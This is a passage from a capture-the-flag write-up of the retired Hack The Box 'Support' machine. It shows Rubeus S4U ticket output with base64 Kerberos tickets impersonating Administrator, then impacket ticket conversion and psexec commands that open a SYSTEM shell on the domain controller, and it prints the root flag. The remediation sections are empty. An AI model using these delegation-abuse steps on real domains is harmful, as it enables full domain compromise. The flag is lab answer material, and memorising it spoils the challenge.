      1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEEO4jIbKFXtACk45b5EADFxOh
      DRsLU1VQUE9SVC5IVEKiGTAXoAMCAQGhEDAOGwxGQUtFLUNPTVAwMSSjBwMFAEDhAAClERgPMjAyNjA3
      MjIxMzIxMjdaphEYDzIwMjYwNzIyMjMyMTI3WqcRGA8yMDI2MDcyOTEzMjEyN1qoDRsLU1VQUE9SVC5I
      VEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBvcnQuaHRi


[*] Action: S4U

[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      MA4bDEZBS0UtQ09NUDAxJA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```

**Key finding:** a valid Kerberos service ticket impersonating `Administrator` for `cifs/dc.support.htb` is obtained — usable to authenticate to the DC as a Domain Admin.

**Next:** Convert the base64 `.kirbi` ticket to Impacket's `.ccache` format and open a SYSTEM shell on the DC with `psexec.py`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.9 Convert the Ticket and Open a SYSTEM Shell

The forged `Administrator` ticket is in `.kirbi` format; converting it to Impacket's `.ccache` allows `psexec.py` to authenticate to the DC over Kerberos and execute as SYSTEM.

**Command:**

```
cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

**Breakdown:**

- `tr -d '[:space:]' | base64 -d`
    - **Description:** Strips display whitespace, then Base64-decodes to the raw ticket.
    - **Purpose:** Reconstructs the binary `.kirbi` from Rubeus's formatted output.
- `impacket-ticketConverter ticket.kirbi ticket.ccache`
    - **Description:** Converts a Windows `.kirbi` ticket to a Linux `.ccache` credential cache.
    - **Purpose:** Produces the format Impacket tools read for Kerberos auth.
- `KRB5CCNAME=ticket.ccache`
    - **Description:** Environment variable pointing Kerberos to the ticket cache.
    - **Purpose:** Supplies the impersonation ticket to `psexec.py`.
- `impacket-psexec ... -k -no-pass`
    - **Description:** PsExec-style remote execution; `-k` uses Kerberos, `-no-pass` skips password auth.
    - **Purpose:** Authenticates to the DC with the forged ticket and launches a SYSTEM shell.

**Result:**

```
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file PpITEHDH.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service ySkE on dc.support.htb.....
[*] Starting service ySkE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

**Key finding:** an interactive shell on the Domain Controller as `NT AUTHORITY\SYSTEM` — full compromise of the domain.

**Next:** Capture the root flag to complete the engagement.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.10 Capture the Root Flag

With a SYSTEM shell on the DC, retrieving `root.txt` confirms and records full domain compromise.

**Command:**

```
whoami
type C:\Users\Administrator\Desktop\root.txt
```

**Result:**

```
nt authority\system941a0c1e86af05f9f1c5a3ccb4ee583e
```

> ### ROOT FLAG: `941a0c1e86af05f9f1c5a3ccb4ee583e`

_What this gives you:_ Confirmed execution as `NT AUTHORITY\SYSTEM` on the Domain Controller — the engagement objective is met.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

